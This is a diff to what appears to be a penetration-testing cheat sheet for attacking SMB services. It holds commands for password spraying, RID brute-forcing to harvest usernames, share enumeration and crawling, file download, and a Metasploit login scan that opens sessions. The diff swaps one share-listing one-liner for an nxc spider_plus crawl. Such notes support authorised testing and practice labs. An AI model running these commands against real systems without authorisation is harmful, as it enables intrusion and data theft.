@@ -484,10 +484,12 @@ nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames
 
-smbmap -H $TARGET -u '$USERNAME' -p '$PASSWORD' | grep -vE 'Authenticating|Enumerating|Closing|Checking|Detected' | awk '/Disk/{f=1;next} f {print $1" "$2" "$3}' | sed '1d' | awk '{print "use " $1 "\n"$2 $3"\ntree\n\n"}' > SMBcommands ; impacket-smbclient /'$USERNAME':'$PASSWORD'@$TARGET -inputfile SMBcommands | grep -vE '[-]|# tree|\*\*\*' | sed 's/^[ \t]*//' | tee SMBfiles
+NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | grep -oP '(?<=Saved share-file metadata to ")[^"]+');cat $NXCSPIDER | grep -vE 'epoch|size' | sed -E 's/[{}\",:]//g' | sed '/^        $/d'
 
 smbclient \\\\$TARGET\\SHARENAME -U '$USERNAME'%'$PASSWORD'
 impacket-smbclient /'$USERNAME':'$PASSWORD'@$TARGET
+
+get filename.txt
 
 msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set BLANK_PASSWORDS true; set CreateSession true; run"
 sessions -i 1
